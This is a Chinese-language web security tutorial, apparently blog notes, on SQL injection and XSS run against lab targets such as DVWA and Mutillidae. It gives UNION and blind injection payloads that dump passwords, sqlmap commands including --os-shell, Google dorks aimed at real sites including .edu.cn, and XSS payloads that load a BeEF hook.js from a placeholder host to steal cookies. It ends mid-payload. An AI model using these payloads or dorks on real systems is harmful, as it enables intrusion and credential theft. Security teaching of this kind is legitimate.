<p>布尔逻辑注入的思路是闭合 SQL 语句、构造 or 和 and 逻辑语句、注释多余的代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT first_name, last_name FROM users WHERE user_id &#x3D; &#39;&#39;</span><br><span class="line"># &#39; or 1&#x3D;1 -- zzr</span><br><span class="line">SELECT first_name, last_name FROM users WHERE user_id &#x3D; &#39; &#39; or 1&#x3D;1 -- zzr &#39;</span><br><span class="line"># or 前面的单引号闭合前面的语句</span><br><span class="line"># or 1&#x3D;1 为真的条件</span><br><span class="line"># -- 注释后面的语句，必须把最后的单引号注释掉</span><br><span class="line"># --后一定要有空格才可以注释,不加空格会报错</span><br><span class="line"># 在 -- 后一定要加一个空格</span><br></pre></td></tr></table></figure>
<h3 id="基于-union-注入">基于 UNION 注入</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># UNION语句用于联合前面的SELECT查询语句，合并查询更多的信息</span><br><span class="line"># 一般通过错误和布尔注入确认注入点之后，便开始通过UNION语句来获取有效信息</span><br><span class="line"></span><br><span class="line"># 猜测数据列数</span><br><span class="line">&#39; union select 1 -- &#39;</span><br><span class="line">&#39; union select 1,2 -- &#39;</span><br><span class="line">&#39; union select 1,2,3 -- &#39;</span><br><span class="line">&#39; order by 1 #</span><br><span class="line">&#39; order by 2 #</span><br><span class="line">&#39; order by 3 # </span><br><span class="line"># Unknown column &#39;3&#39; in &#39;order clause&#39;</span><br><span class="line"></span><br><span class="line"># SQL注入语句解析</span><br><span class="line">mysql&gt; select first_name,last_name from dvwa.users where user_id &#x3D; &#39;&#39; union select 1 -- &#39;&#39;</span><br><span class="line"></span><br><span class="line"># 获得当前数据库及用户信息</span><br><span class="line"># version() 获取数据库版本信息</span><br><span class="line"># database() 获取当前数据库名</span><br><span class="line"># user() 获取当前用户名</span><br><span class="line">&#39;union select version(),database() -- &#39;</span><br><span class="line">&#39;union select user(),database() -- &#39;</span><br><span class="line">mysql&gt; select first_name,last_name from dvwa.users where user_id&#x3D;&#39;&#39; union select version(),database() -- &#39;&#39;</span><br><span class="line"></span><br><span class="line"># 查询数据库中所有表</span><br><span class="line"># information_schema数据库是MySQL自带的，提供了访问数据库元数据的方式</span><br><span class="line"># 元数据包括数据库名、表名、列数据类型、访问权限、字符集等基础信息</span><br><span class="line"></span><br><span class="line"># SQL注入语句解析</span><br><span class="line">mysql&gt; select * from information_schema.TABLES\G</span><br><span class="line"></span><br><span class="line"># 查询所有库名</span><br><span class="line">&#39; union select TABLE_SCHEMA,1 from INFORMATION_SCHEMA.TABLES -- &#39;</span><br><span class="line"># 发现只有两个库，说明当前权限下只能看到两个库</span><br><span class="line"></span><br><span class="line"># 查看所有库中的所有表名 同时查询表名和对应的库名</span><br><span class="line">&#39; union select TBALE_SCHEMA，table_name from INFORMATION_SCHEMA.tables -- &#39;</span><br><span class="line"></span><br><span class="line"># 查询数据表</span><br><span class="line">&#39; union select 1, column_name from INFORAMTION_SCHEMA.columnswjere table_name &#x3D; &#39;user&#39; -- &#39;</span><br><span class="line"></span><br><span class="line"># 查询数据列</span><br><span class="line"># 此处未写库名，在sql注入中就是当前的库</span><br><span class="line">&#39; union select NULL, user from users -- &#39;</span><br><span class="line">&#39; union select NULL, password from users -- &#39;</span><br><span class="line">&#39; union select user, password from users -- &#39;</span><br><span class="line"># 把其他字段组合到一起</span><br><span class="line">&#39; union select password, concat(first_name, &#39; &#39;, last_name, &#39; &#39;, user) from users -- &#39;</span><br></pre></td></tr></table></figure>
<h3 id="基于时间的盲注">基于时间的盲注</h3>
<p>有些数据库对错误信息做了安全配置，使得无法通过以上的方式探测到注入点，此时可以通过<strong>设置 sleep 语句</strong>来探测注入点</p>
<p>SQL Injection (Blind) 盲注</p>
<ul>
<li><p>输入单引号没反应</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; and sleep(5) -- </span><br><span class="line"># 说明我们给定的附加语句可以执行</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="sqlmap-自动化注入">sqlmap 自动化注入</h2>
<p>SQL 注入比较好用的工具，首推开源工具 SQLmap，是一个国内外著名的安全稳定性测试工具，可以用来进行自动化检测，利用 SQL 注入漏洞，获取数据库服务器的权限。它具有功能强大的检测引擎、针对各种不同类型数据库的安全稳定性测试的功能选项，包括获取数据库中储存的数据，访问操作系统文件甚至可以通过外带数据连接的方式执行操作系统命令</p>
<p>SQLmap 支持 MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、IBM DB2、SQLite、Firebird、Sybase 和 SAP MaxDB 等数据库的各种安全漏洞检测</p>
<p>在 kali 上自带</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap --version</span><br><span class="line">sqlmap --hh | less</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在谷歌上搜 inurl .php?id=1</span></span><br></pre></td></tr></table></figure>
<h3 id="get-方法注入">GET 方法注入</h3>
<p>先找一个无需登录的靶机 QWASP Mutillidae Ⅱ &gt; OWASP 2013 &gt; A1 - Injection(SQL) &gt; SQLi - Extract Data &gt; User Info(SQL)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.50.129&#x2F;mutillidae&#x2F;index.php?page&#x3D;user-info.php&amp;username&#x3D;purple&amp;password&#x3D;1234&amp;user-info-php-submit-button&#x3D;View+Account+Details&quot; --batch -p username</span><br></pre></td></tr></table></figure>
<p><img src="sqlmap-nologin.png" alt="sqlmap-nologin" style="zoom:80%;" /></p>
<p><img src="sqlmap-nologin2.png" alt="sqlmap-nologin2" style="zoom:80%;" /></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 自动化完成</span></span><br><span class="line">--batch</span><br><span class="line"><span class="comment"># 获得所有数据库</span></span><br><span class="line">--dbs</span><br><span class="line"><span class="comment"># 获得所有用户</span></span><br><span class="line">--users</span><br><span class="line"><span class="comment"># 获得当前用户</span></span><br><span class="line">--current-user</span><br><span class="line"><span class="comment"># 获得当前数据库</span></span><br><span class="line">--current-db</span><br><span class="line"></span><br><span class="line">--level=5 --risk=3</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获得表 -D &quot;database_name&quot; --tables</span></span><br><span class="line">-D wordpress --tables </span><br><span class="line"></span><br><span class="line"><span class="comment"># 获得列 -D &quot;database_name&quot; -T &quot;table_name&quot; --columns</span></span><br><span class="line">-D wordpress -T wp_users --columns</span><br><span class="line"></span><br><span class="line">--dump-all</span><br><span class="line"><span class="comment"># 排除</span></span><br><span class="line">--dump-all --exclude-sysdbs</span><br><span class="line"><span class="comment"># crack password</span></span><br><span class="line">-D <span class="string">&quot;database_name&quot;</span> -T <span class="string">&quot;table_name&quot;</span> --dump</span><br><span class="line"><span class="comment"># 指定列名</span></span><br><span class="line">-D <span class="string">&quot;database_name&quot;</span> -T <span class="string">&quot;table_name&quot;</span> -C <span class="string">&quot;username,password&quot;</span> --dump</span><br></pre></td></tr></table></figure>
<p>需要帐号登录的靶机：DVWA</p>
<ul>
<li><p>通过 cookie：早期用户名密码是保存在 cookie 当中，不安全；如今不保存在客户端，而保存在服务器端的 session 当中。服务器会给客户端生成一个 session_id，客户端把 session_id 保存在 cookie 当中，在 session 没有过期之前，客户端持有这个 session_id 都可以无需登录访问页面。</p>
<p>firefox 的插件：Cookiebro / Cookie Quick Manager</p>
<p>Google Chrome:</p>
<p><img src="cookie.png" alt="cookie" style="zoom:50%;" /></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 要写全网址</span></span><br><span class="line"><span class="comment"># 指定参数 -p</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://192.168.50.129/dvwa/vulnerabilities/sqli/?id=2&amp;Submit=Submit&quot;</span> -p id --batch</span><br><span class="line">sqlmap -u <span class="string">&quot;http://192.168.50.129/dvwa/vulnerabilities/sqli/?id=2&amp;Submit=Submit#&quot;</span> -p id --batch --cookie=<span class="string">&quot;xxx=xxx;xxx=xxx&quot;</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://192.168.50.129/dvwa/vulnerabilities/sqli/?id=2&amp;Submit=Submit#&quot;</span> -p id --batch --dbms=mysql </span><br></pre></td></tr></table></figure>
<p><img src="sqlmap-login.png" alt="sqlmap-login" style="zoom:80%;" /></p>
<p><img src="sqlmap-login2.png" alt="sqlmap-login2" style="zoom:80%;" /></p>
<p>其他数据操作同理</p>
<p><img src="dbs.png" /></p></li>
</ul>
<h3 id="post-方法注入">POST 方法注入</h3>
<p>利用 sqlmap 进行 post 注入的方式有三种：</p>
<ol type="1">
<li>Burpsuite 抓包，然后保存抓取到的内容(提交表单的数据包，含有用户名密码信息)。例如：保存为 post.txt,然后把它放至某个目录下。运行 sqlmap 并使用如下命令：<strong>sqlmap -r post.txt -p id</strong>，这里参数 -r 是让 sqlmap 加载我们的 post 请求 post.txt，-p 指定注入用的参数</li>
<li>自动搜索表单的方式：sqlmap -u "http://192.168.160.1/sqltest/post.php" --forms</li>
<li>指定一个参数的方法：sqlmap -u "http://xxx.xxx.com/Login.asp" --data "n=1&amp;p=1"</li>
</ol>
<p>参考资料：</p>
<ul>
<li>https://hackertarget.com/sqlmap-post-request-injection/</li>
<li>https://blog.csdn.net/u011781521/article/details/58594941</li>
</ul>
<h3 id="数据获取">数据获取</h3>
<ol type="1">
<li>猜解当前数据库名</li>
<li>猜解数据库中的表名</li>
<li>猜解表中的字段名</li>
<li>猜解数据</li>
</ol>
<h3 id="提权操作">提权操作</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 与数据库交互</span><br><span class="line">--sql-shell</span><br><span class="line"># 不是所有命令都有</span><br><span class="line"></span><br><span class="line"># 与操作系统交互</span><br><span class="line">--os-shell</span><br><span class="line"># 对某些网站目录有写权限才可以成功创建os-shell</span><br><span class="line"></span><br><span class="line">--os-cmd&#x3D;ls &#x2F;</span><br></pre></td></tr></table></figure>
<h3 id="综合实例">综合实例</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 通过Google搜索可能存在注入的页面</span><br><span class="line">   inurl:.php?id&#x3D;</span><br><span class="line">   inurl:.jsp?id&#x3D;</span><br><span class="line">   inurl:.asp?id&#x3D;</span><br><span class="line">   inurl:&#x2F;admin&#x2F;login.php</span><br><span class="line">   inurl:.php?id&#x3D; intitle:xxx</span><br><span class="line">2. 通过百度搜索可能存在注入的页面</span><br><span class="line">   inurl:news.asp?id&#x3D; site:edu.cn</span><br><span class="line">   inurl:news.php?id&#x3D; site:edu.cn</span><br><span class="line">   inurl:news.aspx?id&#x3D; site:edu.cn</span><br></pre></td></tr></table></figure>
<h2 id="dvwa-sql-injection">dvwa sql injection</h2>
<ul>
<li><p>medium security</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Submit&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Retrieve data</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span class="variable">$id</span> = mysql_real_escape_string(<span class="variable">$id</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$getid</span> = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = <span class="subst">$id</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$result</span> = mysql_query(<span class="variable">$getid</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;&lt;pre&gt;&#x27;</span> . mysql_error() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$num</span> = mysql_numrows(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$i</span>=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$i</span> &lt; <span class="variable">$num</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$first</span> = mysql_result(<span class="variable">$result</span>,<span class="variable">$i</span>,<span class="string">&quot;first_name&quot;</span>);</span><br><span class="line">        <span class="variable">$last</span> = mysql_result(<span class="variable">$result</span>,<span class="variable">$i</span>,<span class="string">&quot;last_name&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;ID: &#x27;</span> . <span class="variable">$id</span> . <span class="string">&#x27;&lt;br&gt;First name: &#x27;</span> . <span class="variable">$first</span> . <span class="string">&#x27;&lt;br&gt;Surname: &#x27;</span> . <span class="variable">$last</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$i</span>++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>数字型注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 获取当前数据库</span><br><span class="line">1 union select 1,database() #</span><br><span class="line"></span><br><span class="line"># 获取数据库中的表</span><br><span class="line">1 union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() #</span><br><span class="line"></span><br><span class="line"># 获取表中的字段名</span><br><span class="line">1 union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; #</span><br><span class="line">1 union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;0x7573657273 #</span><br><span class="line"></span><br><span class="line"># 得到数据</span><br><span class="line">1 union select group_concat(user_id,first_name),group_concat(password) from users #</span><br><span class="line"></span><br><span class="line"># 此处password是密文，需要MD５转换</span><br></pre></td></tr></table></figure>
<ul>
<li>获取表中的字段名：<code>1 union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #</code>，会报错<code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\'users\' #' at line 1</code>，是因为<code>mysql_real_escape_string</code>函数是转义了 SQL 语句字符串中的特殊字符，如输入单引号'则处理时会在其前面加上右斜杠，如果语句错误则输出相应的错误信息。其中受影响的字符如下：<code>\x00 \n \r \ ' " \x1a</code>。所以更换注入方式，不要用单引号，可以用 16 进制绕过，将 users 变为 0x7573657273</li>
</ul></li>
<li><p>high security</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Submit&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Retrieve data</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span class="variable">$id</span> = stripslashes(<span class="variable">$id</span>);</span><br><span class="line">    <span class="variable">$id</span> = mysql_real_escape_string(<span class="variable">$id</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_numeric(<span class="variable">$id</span>))&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$getid</span> = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span> = mysql_query(<span class="variable">$getid</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;&lt;pre&gt;&#x27;</span> . mysql_error() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="variable">$num</span> = mysql_numrows(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$i</span>=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="variable">$i</span> &lt; <span class="variable">$num</span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$first</span> = mysql_result(<span class="variable">$result</span>,<span class="variable">$i</span>,<span class="string">&quot;first_name&quot;</span>);</span><br><span class="line">            <span class="variable">$last</span> = mysql_result(<span class="variable">$result</span>,<span class="variable">$i</span>,<span class="string">&quot;last_name&quot;</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;ID: &#x27;</span> . <span class="variable">$id</span> . <span class="string">&#x27;&lt;br&gt;First name: &#x27;</span> . <span class="variable">$first</span> . <span class="string">&#x27;&lt;br&gt;Surname: &#x27;</span> . <span class="variable">$last</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$i</span>++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p>PHP stripslashes()函数的作用是删除由 addslashes() 函数添加的反斜杠；PHP addslashes()函数在预定义字符(<code>' " \</code>)之前添加反斜杠</p></li>
<li><p>此时输入单引号' 页面没有报错，所以证明后台能够处理单引号</p></li>
<li><p>在 high security 中，PHP 的 magic_quotes_gpc 被自动设为 on，magic_quotes_gpc 被称为魔术引号，开启它之后，可以对所有的 GET、POST 和 COOKIE 传值的数据自动运行 addslashes() 函数，所以这里才要使用 stripslashes() 函数去除。magic_quotes_gpc 功能在 PHP5.3.0 中已经废弃并且在 5.4.0 中已经移除了，这也是为什么在 DVWA 中一直强调使用 mysql_real_escape_string() 函数进行过滤的原因吧</p></li>
<li><p>在执行查询之前，使用了 if 语句进行判断，判断的条件是一个 is_numeric() 函数，即判断用户输入的数据是否是数字型，只要不是数字型就一概报错，则 and、or、select 等语句都无法执行了。最后在具体执行查询时，还要求 $id 是字符型</p></li>
</ul></li>
</ul>
<h3 id="代码层面防护">代码层面防护</h3>
<ul>
<li>对于数字型注入，只要使用 if 语句，并以 is_number() 函数作为判断条件就足以防御了。</li>
<li>对于字符型注入，只要对用于接收用户参数的变量，用 mysql_real_escape_string() 函数进行过滤也就可以了。</li>
</ul>
<p>参考资料：</p>
<ul>
<li>https://blog.51cto.com/yttitan/1720191</li>
</ul>
<hr />
<h2 id="dvwa-sql-injectionblind">dvwa sql injection(Blind)</h2>
<p>需要换一个靶机</p>
<ul>
<li>low security</li>
<li>medium security</li>
<li>high security</li>
</ul>
<p>参考资料：</p>
<ul>
<li>https://blog.csdn.net/zjw0411/article/details/79714645</li>
<li>https://www.cnblogs.com/bmjoker/p/8797968.html</li>
<li>https://www.freebuf.com/articles/web/120985.html</li>
</ul>
<p>PDO 技术</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Check Anti-CSRF token </span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;id&#x27;</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Was a number entered? </span></span><br><span class="line">    <span class="keyword">if</span>(is_numeric( <span class="variable">$id</span> )) &#123; </span><br><span class="line">        <span class="comment">// Check the database </span></span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27;</span> ); </span><br><span class="line">        <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:id&#x27;</span>, <span class="variable">$id</span>, PDO::PARAM_INT ); </span><br><span class="line">        <span class="variable">$data</span>-&gt;execute(); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Get results </span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$data</span>-&gt;rowCount() == <span class="number">1</span> ) &#123; </span><br><span class="line">            <span class="comment">// Feedback for end user </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="comment">// User wasn&#x27;t found, so the page wasn&#x27;t! </span></span><br><span class="line">            header( <span class="variable">$_SERVER</span>[ <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span> ] . <span class="string">&#x27; 404 Not Found&#x27;</span> ); </span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for end user </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token </span></span><br><span class="line">generateSessionToken(); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>PDO 全名 PHP Data Object(PHP 数据对象)，为 PHP 访问数据库定义了一个轻量级的一致接口，提供了一个数据访问抽象层，即不管使用哪种数据库，都可以用相同的函数（方法）来查询和获取数据。在 bindParam() 方法中，默认绑定的参数类型就是字符串，此处规定为 int 类型。</p>
<hr />
<h1 id="xss-跨站脚本攻击">XSS 跨站脚本攻击</h1>
<h2 id="xss-简介">XSS 简介</h2>
<blockquote>
<p>跨站脚本(cross site script)为了避免与样式 css 混淆，所以简称为 XSS</p>
<p>是一种经常出现在 web 应用中的计算机安全漏洞，也是 web 中最主流的攻击方式，对客户端进行攻击(挂马)</p>
<p>是指恶意攻击者利用网站没有对用户提交数据进行<u>转义处理</u>或者<u>过滤不足</u>的缺点，进而添加一些代码，嵌入到 web 页面中去，使别的用户访问都会执行相应的嵌入代码，从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式</p>
<p>XSS 攻击的危害：</p>
<ol type="1">
<li>盗取各类用户帐号，如机器登录账号、用户网银账号、各类管理员账号</li>
<li>控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力</li>
<li>盗取企业重要的具有商业价值的资料</li>
<li>非法转账</li>
<li>强制发送电子邮件</li>
<li>网站挂马</li>
<li>控制受害者机器向其他网站发起攻击</li>
</ol>
</blockquote>
<h2 id="xss-原理">XSS 原理</h2>
<p><img src="xss.png" /></p>
<blockquote>
<p>XSS 主要原因：过于信任客户端提交的数据</p>
<p>反射型 XSS 是一种非持久性的攻击，又称为非持久性跨站点脚本攻击，是最常见的。漏洞产生的主要原因是攻击者注入的数据反映在响应中，一个典型的非持久性 XSS 包含一个带 XSS 攻击向量的链接(即每次攻击需要用户的点击)。指的是恶意攻击者往 Web 页面里面插入恶意代码，当用户浏览该页面的时候，嵌入 Web 里面的代码会被执行，从而达到恶意攻击用户的目的。这里插入的恶意代码并没有保存在目标网站，需要引诱用户主动点击一个链接到目标网站的恶意链接来实施攻击</p>
<p>存储型 XSS(Stored XSS) 又称为持久型跨站点脚本，它一般发生在 XSS 攻击向量(一般指 XSS 攻击代码)存储在网站数据库，当一个页面被用户打开的时候执行。每当用户打开浏览器，脚本执行。持久的 XSS 相比于非持久的 XSS 攻击危害性更大，因为每当用户打开页面、查看内容时，脚本将自动执行</p>
<p>图解：web 服务器的某个网站存在存储型 XSS 漏洞，黑客将恶意代码注入 web 服务器，web 服务器存储在本地，用户访问含有恶意代码的页面，自动执行恶意代码，从而去访问黑客机器上钩，黑客机器用 BeEF 控制用户机器</p>
</blockquote>
<h2 id="构造-xss-脚本">构造 XSS 脚本</h2>
<h3 id="常用的-html-标签">常用的 HTML 标签</h3>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span>&gt;</span> iframe元素会创建包含另外一个文档的内联框架(即行内框架)</span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span> 定义多行的文本输入控件</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span>&gt;</span> 向网页中嵌入一幅图像</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span> 用于定义客户端脚本，比如JavaScript；script元素既可以包含脚本语句，也可以通过src属性指向外部脚本文件；必须的type属性规定脚本的MIME类型；JavaScript的常见应用是图像操作、表单验证以及动态内容更新</span><br></pre></td></tr></table></figure>
<h3 id="常见-javascript-方法">常见 JavaScript 方法</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">alert 显示带有一条指定消息和一个确认按钮的警告框</span><br><span class="line"><span class="built_in">window</span>.location 获得当前页面的地址(URL)，并把浏览器重定向到新的页面</span><br><span class="line">location.href 返回当前显示的文档的完整URL</span><br><span class="line">onload 一张页面或一幅图像完成加载</span><br><span class="line">onsubmit 确认按钮被点击</span><br><span class="line">onerror 在加载文档或图像时发生错误</span><br></pre></td></tr></table></figure>
<h3 id="构造-xss-脚本-1">构造 XSS 脚本</h3>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"># 弹框警告</span><br><span class="line"># 实现弹框提示，一般作为漏洞测试或者演示使用，类似SQL注入漏洞测试中的单引号&#x27;，一旦此脚本能执行，也就意味着后端服务器没有对特殊字符做过滤<span class="tag">&lt;&gt;</span>/&#x27;，可证明这个页面位置存在XS漏洞</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"># 页面嵌套</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">http://www.baidu.com</span> <span class="attr">width</span>=<span class="string">300</span> <span class="attr">height</span>=<span class="string">300</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"># 隐藏他</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">http://www.baidu.com</span> <span class="attr">width</span>=<span class="string">0</span> <span class="attr">height</span>=<span class="string">0</span> <span class="attr">border</span>=<span class="string">0</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"># 页面重定向</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.location=<span class="string">&quot;http://www.baidu/com&quot;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">location.href=<span class="string">&quot;http://www.baidu.com&quot;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"># 弹框警告并重定向</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&quot;我们的网站已升级，请移步到新的网站&quot;</span>);location.href=<span class="string">&quot;http://www.baidu.com&quot;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"># 结合一些社工的思路，例如通过网站内部私信的方式将其发给其他用户，如果其他用户点击并且相信了这个信息，则可能在另外的站点重新登录账户(克隆网站收集账户)</span><br><span class="line"></span><br><span class="line"># 访问恶意代码</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://xxx/hook.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"># 结合BeEF手机用户的cookie</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://BeEF_IP:3000/hook.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"># 巧用图片标签 - 隐蔽</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;#&quot;</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;);&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://BeEF_IP:3000/hook.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">img</span>&gt;</span></span><br><span class="line"></span><br><span class="line"># 绕开过滤的脚本</span><br><span class="line"># 大小写</span><br><span class="line"><span class="tag">&lt;<span class="name">ScrIpt</span>&gt;</span><span class="javascript">alert(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span 